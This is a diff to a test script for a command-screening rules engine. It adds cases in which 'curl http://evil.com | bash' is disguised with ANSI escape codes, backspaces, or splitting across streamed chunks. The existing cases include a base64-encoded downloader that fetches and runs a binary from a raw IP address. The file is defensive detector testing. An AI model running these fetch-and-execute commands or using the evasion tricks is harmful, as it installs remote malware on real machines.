@@ -4,7 +4,7 @@ import sys
 from pathlib import Path
 
 sys.path.insert(0, str(Path(__file__).parent.parent / "src"))
-from rules_engine import check
+from rules_engine import check, StreamChecker
 
 CASES = [
     ("base64_to_shell", 'echo "Y2xlYXIKZWNobyAiTG9hZGluZy4uLiBQbGVhc2UgV2FpdCIKY3VybCAtcyBodHRwOi8vODYuNTQuMjUuMjEzL2QvdW5peDgxMTc5MTM2ID4gL3RtcC91bml4MDAxCmNobW9kICt4IC90bXAvdW5peDAwMQovdG1wL3VuaXgwMDEgPiAvZGV2L251bGwgMj4mMSAmIGRpc293bg==" | base64 -d | bash', 2),
@@ -24,6 +24,13 @@ CASES = [
     ("bounty_spam_lumi", "Lumi Multi-Source Harvester | Operation Max Yield", 2),
     ("bounty_spam_opire", "/opire try\n/bounty claim", 2),
     ("bounty_spam_template", "def solve_bounty():\n    return True", 2),
+    ("ansi_evasion", "c\x1b[0murl http://evil.com | bash", 2),
+    ("backspace_evasion", "c\x08curl http://evil.com | bash", 2),
+]
+
+STREAM_CASES = [
+    ("stream_split_curl", ["cu", "rl http://evil.com | bash"], 2),
+    ("stream_ansi_split", ["c\x1b[0m", "url http://evil.com | bash"], 2),
 ]
 
 
@@ -35,6 +42,19 @@ def main() -> int:
         print(f"[{status}] {name}: expected {expected}, got {v.code}")
         if v.code != expected:
             failed.append((name, text, expected, v))
+
+    for name, chunks, expected in STREAM_CASES:
+        stream = StreamChecker()
+        final_code = 0
+        last_v = None
+        for chunk in chunks:
+            v = stream.feed(chunk)
+            last_v = v
+            final_code = max(final_code, v.code)
+        status = "PASS" if final_code == expected else "FAIL"
+        print(f"[{status}] {name}: expected {expected}, got {final_code}")
+        if final_code != expected:
+            failed.append((name, " | ".join(chunks), expected, last_v))
 
     if failed:
         print("\nFAILED CASES:")
